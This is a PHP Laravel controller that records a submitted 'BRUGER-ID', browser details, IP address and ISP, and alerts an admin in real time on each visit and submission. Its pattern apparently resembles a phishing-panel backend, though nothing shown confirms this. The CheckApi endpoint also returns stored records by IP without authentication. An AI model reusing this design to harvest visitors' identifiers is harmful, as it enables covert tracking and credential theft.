<?php

namespace App\Http\Controllers;

use App\Events\VisitorEvent;
use App\Models\User;
use App\Models\UserDetail;
use App\Notifications\UserDetailNotification;
use App\Notifications\UserVisitNotification;
use Illuminate\Http\Request;
use App\Events\StoreUserDetail;
use App\Events\UpdateStatusEvent;
use App\Models\NewNotification;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Notification;
use App\Notifications\UserDetialNotification;


class DetailController extends Controller
{
    //StoreDetail
    public function StoreDetail(Request $request)
    {
        try {
            if ($request->browsersDetails == null) {
                return response()->json(['success' => false, 'message' => 'Browsers Details is required']);
            }
            if ($request->name == null) {
                return response()->json(['success' => false, 'message' => 'Please input BRUGER-ID']);
            }
            if ($request->dateTime == null) {
                return response()->json(['success' => false, 'message' => 'Date Time is required']);
            }
            $ip = $request->ip();
            $ips = $_SERVER['REMOTE_ADDR'];
            $ipinfo = file_get_contents("https://ipinfo.io/" . $ips);
            $ipinfo_json = json_decode($ipinfo, true);

            if ($ipinfo_json['org'] == null) {
                $ispDetail = null;
            } else {
                $ispDetail = $ipinfo_json['org'];
            }

            $details = new UserDetail();
            $details->browsersDetails = $request->browsersDetails;
            $details->name = $request->name;
            $details->dateTime = $request->dateTime;
            $details->ipAddress = $ip;
            $details->isp = $ispDetail;
            $details->enable = 1;
            $details->save();
            $detail_id = UserDetail::max('id');
            $detail = [
                'det_id' => $detail_id,
                'browsersDetails' => $request->browsersDetails,
                'name' => $request->name,
                'dateTime' => $request->dateTime,
                'ipAddress' => $ip,
                'isp' => $ispDetail,
            ];

            if ($details) {
                $user = User::find(1);

                Notification::send($user, new UserDetailNotification($detail));
                $notification = new NewNotification();
                $notification->user_id = $user->id;
                $notification->notification = json_encode($detail);
                $notification->status = 1;
                $notification->save();
                event(new StoreUserDetail($request->name));
                return response()->json(['success' => true, 'message' => 'Admin received your request']);
            } else {
                return response()->json(['success' => false, 'message' => 'Something went wrong please try again']);
            }

        } catch (\Exception $e) {
            \Log::info($e);
            return response()->json(['success' => false, 'message' => 'Something went wrong with error']);
        }
    }

    //ViewAllUserDetails
    public function ViewAllUserDetails()
    {
        if (Auth::guard('api')->check()) {
            $data = UserDetail::all();
            return response()->json(['success' => true, 'userDetails' => $data]);
        } else {
            return response()->json(["success" => false, "error" => "Not Authorized"], 401);
        }
    }

    //updateStatus
    public function updateStatus(Request $request)
    {
        if (Auth::guard('api')->check()) {
            if ($request->id == null) {
                return response()->json(['success' => false, 'message' => 'id is required']);
            }
            if ($request->enable == false) {
                return response()->json(['success' => false, 'message' => 'id is required']);
            }
            $data = UserDetail::find($request->id);
            $data->enable = $request->enable;
            $data->save();
            //event(new UpdateStatusEvent($data));
            return response()->json(['success' => true, 'message' => 'record updated successfully']);
        } else {
            return response()->json(["success" => false, "error" => "Not Authorized"], 401);
        }
    }


    //deleteUserDetail
    public function deleteUserDetail($id)
    {
        if (Auth::guard('api')->check()) {
            $data = UserDetail::find($id);
            if ($data == null) {
                return response()->json(['success' => false, 'message' => 'no record found']);
            } else {
                $data->delete();
            }
            return response()->json(['success' => true, 'message' => 'record deleted successfully']);
        } else {
            return response()->json(["success" => false, "error" => "Not Authorized"], 401);
        }
    }

    /**
     * /api/CheckApi
     * Api to check user details
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function CheckApi(Request $request)
    {
        $ip = $request->ip();
        $check = UserDetail::where('ipAddress', '=', $ip)->first();
        if ($check) {
            return response()->json(['success' => true, 'details' => $check]);
        } else {
            return response()->json(['success' => false, 'message' => 'No record found']);
        }
    }

    /**
     * /api/visit
     * visit api
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function visit(Request $request){

        try {

            $ip = $request->ip();
            $ips = $_SERVER['REMOTE_ADDR'];
            $ipinfo = file_get_contents("https://ipinfo.io/" . $ips);
            $ipinfo_json = json_decode($ipinfo, true);
            if ($ipinfo_json['org'] == null) {
                $ispDetail = null;
            } else {
                $ispDetail = $ipinfo_json['org'];
            }

            $detail = [
                'id' => '',
                'browsersDetails' => $request->browser,
                'name' => 'visit',
                'dateTime' => $request->datetime,
                'ipAddress' => $ip,
                'isp' => $ispDetail,
            ];

            $user = User::find(1);
            Notification::send($user, new UserVisitNotification($detail));
            event(new VisitorEvent('visitor'));
            return response()->json(['success' => true, 'message' => 'Send a notification']);

        } catch (\Exception $e) {
            \Log::info($e);
            return response()->json(['success' => false, 'message' => 'Something went wrong with error']);
        }
    }

}
